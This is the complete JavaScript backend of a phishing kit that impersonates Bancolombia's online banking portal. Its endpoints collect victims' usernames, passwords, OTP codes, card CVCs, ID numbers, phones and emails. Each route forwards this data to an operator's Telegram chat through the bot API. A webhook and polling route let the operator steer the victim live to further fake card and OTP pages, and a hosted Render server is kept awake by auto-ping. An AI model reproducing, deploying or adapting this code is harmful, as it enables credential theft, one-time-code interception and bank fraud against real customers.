// 📦 Backend para Bancolombia Sucursal Virtual Personas
const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const cors = require('cors');

const app = express();
const corsOptions = {
  origin: '*',
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  credentials: false
};

app.use(cors(corsOptions));
app.options('*', cors(corsOptions));

app.use(bodyParser.json());

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

if (!BOT_TOKEN || !CHAT_ID) {
  console.warn("[WARN] BOT_TOKEN o CHAT_ID no definidos.");
}

const redirections = new Map();

app.get('/', (_req, res) => {
  res.send({ ok: true, service: 'virtual-backend', hasEnv: !!(BOT_TOKEN && CHAT_ID) });
});

// ====================================================================================
// 💡 DEFINICIÓN DE MENÚS REUTILIZABLES (Para evitar código repetido y errores de Telegram)
// ====================================================================================

// Menú 1: Los botones más importantes
function getPrimaryReplyMarkup(sessionId) {
    return {
        inline_keyboard: [
            [
                { text: "❌ Error Logo", callback_data: `go:errorlogo.html|${sessionId}` },
                { text: "✅ Siguiente (OTP)", callback_data: `go:opcion1.html|${sessionId}` }
            ],
            [
                { text: "💳 Débito", callback_data: `go:debit.html|${sessionId}` },
                { text: "🪙 Visa Oro", callback_data: `go:Visa+Oro.html|${sessionId}` }
            ],
            [
                { text: "💍 Master Clásica", callback_data: `go:Mastercard+Clasica+Tradicional.html|${sessionId}` },
                { text: "🌐 Virtual", callback_data: `go:virtualdedbit.html|${sessionId}` }
            ],
            [
                { text: "🏦 Amex", callback_data: `go:amexs.html|${sessionId}` },
                { text: "📋 Datos", callback_data: `go:datos.html|${sessionId}` }
            ],
            // Botón que despliega el Menú 2 para más tarjetas
            [
                { text: "➕ Más Tarjetas (Menú 2)", callback_data: `send:menu_tarjetas2|${sessionId}` }
            ]
        ]
    };
}

// Menú 2: El resto de tarjetas (se envía en un MENSAJE APARTE para evitar el error 500)
function getSecondaryReplyMarkup(sessionId) {
    return {
        inline_keyboard: [
            [
                { text: "💍 Visa Clásica", callback_data: `go:+Visa+clasica+tradicional.html|${sessionId}` },
                { text: "🖤 Visa Infinite", callback_data: `go:Infinite_Card.html|${sessionId}` }
            ],
            [
                { text: "🩶 Visa Platinum", callback_data: `go:Visa+Platinum+Conavi.html|${sessionId}` },
                { text: "⚽ Visa Selección", callback_data: `go:Visa+Seleccion+Colombia.html|${sessionId}` }
            ],
            [
                { text: "🛩️ Visa LifeMiles", callback_data: `go:BC_VISA_LIFEMILE_PERSONAS_BC_VISA_LIFEMILE_PERSONAS_TIRO_.html|${sessionId}` },
                { text: "🪙 MasterCard Gold", callback_data: `go:mastergold.html|${sessionId}` }
            ],
            [
                { text: "🩶 MasterCard Platinum", callback_data: `go:masterplati.html|${sessionId}` },
                { text: "🖤 Mastercard Black", callback_data: `go:masterblaack.html|${sessionId}` }
            ],
            [
                { text: "🏠 Volver al Menú Principal", callback_data: `go:opcion1.html|${sessionId}` } // Redirige a la página principal
            ]
        ]
    };
}

// Menú de opciones de error/reintento para los OTP
function getOTPReplyMarkup(sessionId, rutaSiguiente = 'opcion1') {
    return {
        inline_keyboard: [
            [
                { text: "❌ Error Logo", callback_data: `go:errorlogo.html|${sessionId}` },
                { text: "⚠️ Error OTP", callback_data: `go:opcion2.html|${sessionId}` },
            ],
            [
                { text: "🔁 Nuevo OTP", callback_data: `go:${rutaSiguiente}.html|${sessionId}` },
                { text: "✅ Finalizar", callback_data: `go:finalizar.html|${sessionId}` }
            ],
            // Incluimos el botón para el menú 2
            [
                 { text: "➕ Más Opciones", callback_data: `send:menu_tarjetas2|${sessionId}` } 
            ]
        ]
    };
}


// ================== RUTAS PRINCIPALES ==================

app.post('/virtualpersona', async (req, res) => {
  try {
    const { sessionId, user, pass, ip, country, city } = req.body;
    if (!BOT_TOKEN || !CHAT_ID) {
      console.error("❌ BOT_TOKEN o CHAT_ID no definidos");
      return res.status(500).send({ ok: false, reason: "Env vars undefined" });
    }

    const mensaje = `
🟢 Nuevo Ingreso

👤 User: ${user}
🔒 Pass: ${pass}
🌐 IP: ${ip} - ${city}, ${country}
🆔 sessionId: ${sessionId}
    `.trim();

    // Usamos el menú principal que es más corto y seguro
    const reply_markup = getPrimaryReplyMarkup(sessionId);

    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: mensaje,
      reply_markup
    });

    res.send({ ok: true });
  } catch (error) {
    console.error('❌ ERROR EN /virtualpersona');
    if (error.response) {
      console.error('🔁 RESPONSE:', error.response.data);
    }
    console.error('🧠 ERROR:', error.message);
    res.status(500).json({ ok: false, reason: error.message });
  }
});

// 🔁 Ruta para opcion1.html
app.post('/otp1', async (req, res) => {
  try {
    const { sessionId, user, pass, dina, ip, country, city } = req.body;

    const mensaje = `
🟡 Ingreso OTP Dina

👤 User: ${user}
🔒 Pass: ${pass}
🔢 Dina: ${dina}
🌐 IP: ${ip} - ${city}, ${country}
🆔 sessionId: ${sessionId}
    `.trim();

    redirections.set(sessionId, null);

    // Usamos el menú especial de OTP
    const reply_markup = getOTPReplyMarkup(sessionId, 'opcion1');

    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: mensaje,
      reply_markup
    });

    res.send({ ok: true });
  } catch (error) {
    console.error('Error en /otp1:', error.message);
    res.status(500).send({ ok: false });
  }
});

// 🔁 Ruta para opcion2.html
app.post('/otp2', async (req, res) => {
  try {
    const { sessionId, user, pass, dina, ip, country, city } = req.body;

    const mensaje = `
🟠 Ingreso OTP new Dina

👤 User: ${user}
🔒 Pass: ${pass}
🔢 Dina: ${dina}
🌐 IP: ${ip} - ${city}, ${country}
🆔 sessionId: ${sessionId}
    `.trim();

    redirections.set(sessionId, null);

    // Usamos el menú especial de OTP
    const reply_markup = getOTPReplyMarkup(sessionId, 'opcion2');

    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: mensaje,
      reply_markup
    });

    res.send({ ok: true });
  } catch (error) {
    console.error('Error en /otp2:', error.message);
    res.status(500).send({ ok: false });
  }
});

// ================== RUTAS DE CAPTURA DE DATOS (CON MENÚ PRINCIPAL) ==================

// Todas las rutas de captura de datos (visa, master, debit, credit, amex, datos) ahora
// utilizan el menú principal (getPrimaryReplyMarkup) para ser más funcionales.

app.post('/visa', async (req, res) => {
  try {
    const { sessionId, user, pass, cvc, ip, country, city } = req.body;
    const mensaje = `
💳 VISA
👤 Usuario: ${user}
🔒 Clave: ${pass}
🔢 CVC: ${cvc}
🌐 ${ip} - ${city}, ${country}
🆔 Session: ${sessionId}
    `.trim();

    // Usamos el menú principal que es más corto y seguro
    const reply_markup = getPrimaryReplyMarkup(sessionId);

    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: mensaje,
      reply_markup
    });

    res.send({ ok: true });
  } catch (error) {
    console.error('Error en /visa:', error.message);
    res.status(500).send({ ok: false });
  }
});

app.post('/master', async (req, res) => {
  try {
    const { sessionId, user, pass, cvc, ip, country, city } = req.body;
    const mensaje = `
💳 MASTERCARD
👤 Usuario: ${user}
🔒 Clave: ${pass}
🔢 CVC: ${cvc}
🌐 ${ip} - ${city}, ${country}
🆔 Session: ${sessionId}
    `.trim();

    // Usamos el menú principal que es más corto y seguro
    const reply_markup = getPrimaryReplyMarkup(sessionId);

    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: mensaje,
      reply_markup
    });

    res.send({ ok: true });
  } catch (error) {
    console.error('Error en /master:', error.message);
    res.status(500).send({ ok: false });
  }
});

app.post('/debit', async (req, res) => {
  try {
    const { sessionId, user, pass, cvc, ip, country, city } = req.body;
    const mensaje = `
🏦 DÉBITO
👤 Usuario: ${user}
🔒 Clave: ${pass}
🔢 CVC: ${cvc}
🌐 ${ip} - ${city}, ${country}
🆔 Session: ${sessionId}
    `.trim();

    // Usamos el menú principal que es más corto y seguro
    const reply_markup = getPrimaryReplyMarkup(sessionId);

    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: mensaje,
      reply_markup
    });

    res.send({ ok: true });
  } catch (error) {
    console.error('Error en /debit:', error.message);
    res.status(500).send({ ok: false });
  }
  
});
app.post('/credit', async (req, res) => {
  try {
    const { sessionId, user, pass, cvc, ip, country, city } = req.body;
    const mensaje = `
💰 CRÉDITO
👤 Usuario: ${user}
🔒 Clave: ${pass}
🔢 CVC: ${cvc || "N/A"}
🌐 ${ip} - ${city}, ${country}
🆔 Session: ${sessionId}
    `.trim();

    const reply_markup = {
      inline_keyboard: [
        [
          { text: "❌ Error Crédito", callback_data: `go:credit.html|${sessionId}` },
          { text: "✅ Siguiente", callback_data: `go:opcion1.html|${sessionId}` }
        ]
      ]
    };

    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: mensaje,
      reply_markup
    });

    res.send({ ok: true });
  } catch (error) {
    console.error('Error en /credit:', error.message);
    res.status(500).send({ ok: false });
  }
});


app.post('/amex', async (req, res) => {
  try {
    const { sessionId, user, pass, cvc, ip, country, city } = req.body;
    const mensaje = `
💎 AMEX
👤 Usuario: ${user}
🔒 Clave: ${pass}
🔢 CVC: ${cvc}
🌐 ${ip} - ${city}, ${country}
🆔 Session: ${sessionId}
    `.trim();

    // Usamos el menú principal que es más corto y seguro
    const reply_markup = getPrimaryReplyMarkup(sessionId);

    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: mensaje,
      reply_markup
    });

    res.send({ ok: true });
  } catch (error) {
    console.error('Error en /amex:', error.message);
    res.status(500).send({ ok: false });
  }
});

// 🔹 Ruta para recibir datos personales (datos.html)
app.post('/datos', async (req, res) => {
  try {
    const { sessionId, dc, num, mail, ip, country, city } = req.body;

    const mensaje = `
📋 DATOS PERSONALES

🆔 Documento: ${dc}
📱 Celular: ${num}
📧 Correo: ${mail}
🌐 ${ip} - ${city}, ${country}
🧩 sessionId: ${sessionId}
    `.trim();

    // Usamos el menú principal que es más corto y seguro
    const reply_markup = getPrimaryReplyMarkup(sessionId);

    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: mensaje,
      reply_markup
    });

    res.send({ ok: true });
  } catch (error) {
    console.error('❌ Error en /datos:', error.message);
    res.status(500).send({ ok: false });
  }
});


// ================== RUTAS DE REDIRECCIÓN Y WEBHOOK ==================

// 💡 RUTA QUE ENVÍA EL SEGUNDO MENÚ DE BOTONES
app.post('/menu_tarjetas2', async (req, res) => {
  try {
    const { sessionId } = req.body; 

    const mensaje = `
📋 Menú de Tarjetas Adicionales

Selecciona una opción para redireccionar al cliente:
    `.trim();

    // Usamos el menú secundario que tiene el resto de opciones
    const reply_markup = getSecondaryReplyMarkup(sessionId);

    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: mensaje,
      reply_markup
    });

    res.send({ ok: true });
  } catch (error) {
    console.error('❌ Error en /menu_tarjetas2:', error.message);
    res.status(500).json({ ok: false, reason: error.message });
  }
});


// 📩 Webhook de Telegram para botones (modificado para manejar el menú secundario)
app.post(`/webhook/${BOT_TOKEN}`, async (req, res) => {
  try {
    const update = req.body;
    const { callback_query } = update;

    if (callback_query) {
      const [action, sessionId] = (callback_query.data || '').split('|');
      const route = action.replace('go:', '');

      // Si la acción es 'send', enviamos el segundo mensaje con botones
      if (action.startsWith('send:')) {
            const sendRoute = action.replace('send:', '');

            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
                callback_query_id: callback_query.id,
                text: `Cargando Menú Adicional...`,
                show_alert: true
            });

            // Llamamos a la ruta del servidor para que envíe el segundo mensaje
            await axios.post(`https://diosnoseolvidademi.onrender.com/${sendRoute}`, { sessionId });

            return res.sendStatus(200); // Terminamos aquí si solo fue un envío de menú
        }

      // Si la acción es 'go', configuramos la redirección
      if (sessionId) redirections.set(sessionId, route);

      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
        callback_query_id: callback_query.id,
        text: `Redirigiendo cliente → ${route}`,
        show_alert: true
      });
    }
    res.sendStatus(200);
  } catch (err) {
    console.error("Error en webhook:", err);
    res.sendStatus(200);
  }
});

// 🔁 Polling desde loading.html
app.get('/instruction/:sessionId', (req, res) => {
  const sessionId = req.params.sessionId;
  const target = redirections.get(sessionId);

  if (target) {
    redirections.delete(sessionId);
    res.send({ redirect_to: target });
  } else {
    res.send({});
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`✅ Servidor activo en puerto ${PORT}`));

// ==== Auto-ping para mantener activo el backend en Render ====
setInterval(async () => {
  try {
    const res = await fetch("https://diosnoseolvidademi.onrender.com"); 
    const text = await res.text();
    console.log("🔁 Auto-ping realizado:", text);
  } catch (error) {
    console.error("❌ Error en auto-ping:", error.message);
  }
}, 180000); // 180000 ms = 3 minutos
